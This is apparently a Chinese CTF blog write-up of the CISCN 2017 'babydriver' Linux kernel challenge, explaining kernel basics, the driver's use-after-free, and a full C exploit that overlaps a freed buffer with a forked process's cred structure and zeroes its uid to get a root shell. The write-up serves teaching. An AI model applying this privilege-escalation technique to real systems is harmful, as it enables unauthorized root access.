        <content type="html"><![CDATA[<h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h1><p>拿到文件解压之后是这个样子：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/0.png"></div>接下来进入这个目录，分别需要这么几个命令：```mkdir coremv ../rootfs.cpio rootfs.cpio.gzgunzip ./rootfs.cpio.gzcpio -idmv &lt; rootfs.cpio```<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/1.png"></div><p>现在查看一下它的init文件</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/2.png"></div>加载模块命令，一般在CTF赛题中基本就是这个模块出现问题了。。。<h1 id="2-补充概念："><a href="#2-补充概念：" class="headerlink" title="2.补充概念："></a>2.补充概念：</h1><p><strong>内核</strong>：内核是操作系统的核心，目的是为上层提供一个接口，和CPU进行交互，方式就是通过设置各种CPU所需要的结构，让CPU能够提供相应的功能，比如设置虚拟内存所需要的一些结构，使得CPU能够顺利识别，从而提供虚拟内存功能。和操作系统进行交互可以通过系统调用等方式实现。</p><p><strong>特权等级</strong>：CPU将指令分为各种特权等级，特权指令就是必须在特定特权下才能够执行的指令，否则会出现错误，intel将特权等级分为ring0到ring3，其中ring3特权最低，ring0最高，linux只使用了ring0和ring3，ring0为内核运行的等级，ring3为用户运行的等级。</p><p><strong>内核空间与用户空间</strong>：内核空间就是操作系统自己运行的空间，运行在ring0特权等级，拥有自己的空间，位于内存的高地址，而用户空间则是我们平时应用程序运行的空间，运行在ring3特权等级，使用较低地址。内核拥有自己的栈，和用户空间的栈并不共用。</p><p><strong>系统调用</strong>：系统调用是linux内核向用户空间提供功能的方式，通过调用特定的系统调用，用户空间可以获取内核提供的功能。比如read函数事实上就是一个系统调用，通过传入特定的参数，内核可以读取用户输入，并且输入到buf里。通过使用系统调用，用户空间用户程序将会转入内核空间去执行，在执行完之后通过特殊方式回到用户空间，中间会涉及到用户空间与内核空间的切换。大致流程如下：</p><p>1) 进入<br>i. 通过swapgs切换GS段寄存器，是将GS寄存器值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。<br>ii. 将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，将CPU独占区域里记录的内核栈顶放入rsp(esp)。<br>iii. 通过push保存各寄存器值，代码如下：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span><span class="token punctuation">.</span>  <span class="token function">ENTRY</span><span class="token punctuation">(</span>entry_SYSCALL_64<span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span> <span class="token number">3</span><span class="token punctuation">.</span>  SWAPGS_UNSAFE_STACK <span class="token number">4</span><span class="token punctuation">.</span>  <span class="token number">5</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">/* 保存栈值，并设置内核栈 */</span> <span class="token number">6</span><span class="token punctuation">.</span>  movq <span class="token operator">%</span>rsp<span class="token punctuation">,</span> <span class="token function">PER_CPU_VAR</span><span class="token punctuation">(</span>rsp_scratch<span class="token punctuation">)</span> <span class="token number">7</span><span class="token punctuation">.</span>  movq <span class="token function">PER_CPU_VAR</span><span class="token punctuation">(</span>cpu_current_top_of_stack<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">%</span>rsp <span class="token number">8</span><span class="token punctuation">.</span>  <span class="token number">9</span><span class="token punctuation">.</span>  <span class="token number">10</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span> <span class="token number">11</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">/* Construct struct pt_regs on stack */</span> <span class="token number">12</span><span class="token punctuation">.</span>pushq  $__USER_DS      <span class="token comment" spellcheck="true">/* pt_regs->ss */</span> <span class="token number">13</span><span class="token punctuation">.</span>pushq  <span class="token function">PER_CPU_VAR</span><span class="token punctuation">(</span>rsp_scratch<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">/* pt_regs->sp */</span> <span class="token number">14</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>r11             <span class="token comment" spellcheck="true">/* pt_regs->flags */</span> <span class="token number">15</span><span class="token punctuation">.</span>pushq  $__USER_CS      <span class="token comment" spellcheck="true">/* pt_regs->cs */</span> <span class="token number">16</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rcx             <span class="token comment" spellcheck="true">/* pt_regs->ip */</span> <span class="token number">17</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rax             <span class="token comment" spellcheck="true">/* pt_regs->orig_ax */</span> <span class="token number">18</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rdi             <span class="token comment" spellcheck="true">/* pt_regs->di */</span> <span class="token number">19</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rsi             <span class="token comment" spellcheck="true">/* pt_regs->si */</span> <span class="token number">20</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rdx             <span class="token comment" spellcheck="true">/* pt_regs->dx */</span> <span class="token number">21</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>rcx tuichu    <span class="token comment" spellcheck="true">/* pt_regs->cx */</span> <span class="token number">22</span><span class="token punctuation">.</span>pushq  $<span class="token operator">-</span>ENOSYS        <span class="token comment" spellcheck="true">/* pt_regs->ax */</span> <span class="token number">23</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>r8              <span class="token comment" spellcheck="true">/* pt_regs->r8 */</span> <span class="token number">24</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>r9              <span class="token comment" spellcheck="true">/* pt_regs->r9 */</span> <span class="token number">25</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>r10             <span class="token comment" spellcheck="true">/* pt_regs->r10 */</span> <span class="token number">26</span><span class="token punctuation">.</span>pushq  <span class="token operator">%</span>r11             <span class="token comment" spellcheck="true">/* pt_regs->r11 */</span> <span class="token number">27</span><span class="token punctuation">.</span>sub $<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">%</span>rsp      <span class="token comment" spellcheck="true">/* pt_regs->bp, bx, r12-15 not saved */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>iv. 通过汇编指令判断是否是x32_abi（暂时可以忽略这个内容）。<br>v. 通过系统调用号，跳到全局变量sys_call_table相应位置继续执行相应系统调用。<br>2) 退出<br>i. 通过swapgs恢复GS值。<br>ii. 通过sysretq或者iretq恢复到用户空间进行执行，如果使用Iretq还需要给出用户空间的一些信息，比如CS值，eflags标志寄存器值，用户栈顶位置等等信息。</p><p><strong>slab/slub分配器</strong>：这是一个比较大的内容，内核中也需要使用到内存的分配，类似于用户空间malloc的功能。在内核中没有libc，所以没有malloc，但是需要这样的功能，所以有kmalloc，其实现是使用的slab/slub分配器，现在多见的是slub分配器。这个分配器通过一个多级的结构进行管理。首先有cache层，cache是一个结构，里边通过保存空对象，部分使用的对象和完全使用了对象来管理，对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。kmalloc使用了多个cache，一个cache对应一个2的幂大小的一组内存对象。<br>slab分配器严格按照cache去区分，不同cache的无法分配在一页内，slub分配器则较为宽松，不同cache如果分配相同大小，可能会在一页内，这个点很重要，之后的exp会用到。<br><strong>内核模块/驱动</strong>：这是linux拓展内核功能的一个功能，通过向内核插入内核模块可以动态的加载一些驱动代码，用来负责和硬件进行交互，或者在内核层提供一些软件功能。内核模块运行在内核空间，可以通过设备文件来进行交互，比如/dev/目录下的文件很多就是设备文件，打开设备文件，关闭设备文件等等就是使用open、close函数，这些函数在内核模块里进行定义，然后在加载的时候按照一定的规则进行设置，所以通过这些函数可以调用到内核里的模块的相应设置好的函数，最后在内核完成一系列操作，为用户空间提供功能。<br>SMEP是我需要稍微提一下的，这是一个内核的保护机制，目的是避免ret2usr利用方式，ret2usr即从内核空间劫持控制流，使得控制流回到用户空间，以ring 0执行用户空间代码来进行提权。开启了SMEP的时候，CPU将会阻止在ring 0执行用户空间代码。这是一个CPU功能，由CPU的CR4寄存器管理，用一个位来标志是否开启SMEP保护。不过，SMEP保护并没有阻止直接从用户空间获取数据，只是阻止执行用户空间代码。</p><h1 id="3-IDA分析"><a href="#3-IDA分析" class="headerlink" title="3.IDA分析"></a>3.IDA分析</h1><p>我们拿出驱动文件逆向看看：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/3.png"></div>保护都没开。。。<p>shift + F9 先看一下有什么结构体，可以发现如下的结构体：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/4.png"></div>**babyioctl**: 定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/5.png"></div><p><strong>babyopen</strong>: 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/6.png"></div><p><strong>babyread</strong>: 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/7.png"></div><p><strong>babywrite</strong>: 类似 babyread，不同的是从 buffer 拷贝到全局变量中</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/8.png"></div><p><strong>babyrelease</strong>: 释放空间，将创建的buf释放掉</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/9.png"></div><p>还有 babydriver_init() 和 babydriver_exit() 两个函数分别完成了 /dev/babydev 设备的初始化和清理，查一下函数的用法即可，不再分析。</p><h1 id="4-思路"><a href="#4-思路" class="headerlink" title="4.思路"></a>4.思路</h1><p>babyioctl和babyrelease是getshell 的关键，具体是什么思路呢？由于bss是全局变量，关键是对其操作也没有加锁。那么我们可以同时建立两个驱动对其操作，删除其中一个释放掉创建的chunk我们还可以通过另一个驱动进行UAF操作。</p><p><strong>cred结构体</strong>：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/10.png"></div>该结构体记录了进程的权限，每一个进程中都有一个cred结构体，如果修改了这个cred结构体那么也就修改了权限。得知cred结构体大小可以自己计算，或者直接调试利用sizeof查看大小，每个内核版本的cred大小都不同。<p>那么如何修改该结构体，当然用write函数，因为该处有UAF漏洞，那么让cred结构体出现在UAF处即可用write直接修改cred。该怎么让cred出现在此处，答案是新建一个cred，那么就可以用fork函数产生一个新进程，新进程就会创建一个新的cred了，所以我们就有如下的思路：</p><p><strong>第一步：两次open打开驱动文件得到两个句柄。<br>第二步：利用其中任意一个句柄来进行修改buf.size并创建，但是这个size大小要等于struct cred结构体大小（这就不得不强调一个知识点了，由于kernel heap内存管理释放类似于fastbin，那么释放后如果size合适就第一个分配刚刚释放的，但是具体情况得调试，例如2019 TSCTF里面那个kernel就不是一次分配到的）<br>第三步：释放掉一个驱动文件句柄，将会把我们创建的heap释放掉<br>第四步：创建一个子进程，它会将之前释放的那个heap分给cred结构体<br>第五步：通过另一个未释放的驱动文件句柄进行UAF写入前28给0来getshell（前28个字节里面有uid，我们将其覆盖为0便可以提升权限，最后用户态线程中执行system(“/bin/sh”)）</strong></p><h1 id="5-exp"><a href="#5-exp" class="headerlink" title="5.exp"></a>5.exp</h1><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stropts.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;sys/wait.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;sys/wait.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 打开两次设备</span>    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span>    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span><span class="token number">0x10001</span><span class="token punctuation">,</span><span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 释放 fd1</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span>    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 注意这些需要在线程中执行，否则就继续主程序了</span>        <span class="token comment" spellcheck="true">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span>        <span class="token keyword">char</span> zeros<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span>zeros<span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-后续步骤"><a href="#6-后续步骤" class="headerlink" title="6 后续步骤"></a>6 后续步骤</h1><p>但目前本地环境直接通过脚本打包就没那么麻烦了，但是还是附上全部过程：</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/11.png"></div>**静态编译**<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/24/cisn2017-babydriver/12.png"></div>**将编译后的可执行文件放到文件夹下打包，放入启动文件目录**<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://anquanke.com/post/id/86490" target="_blank" rel="noopener">一道简单内核题入门内核利用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> kernel-UAF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
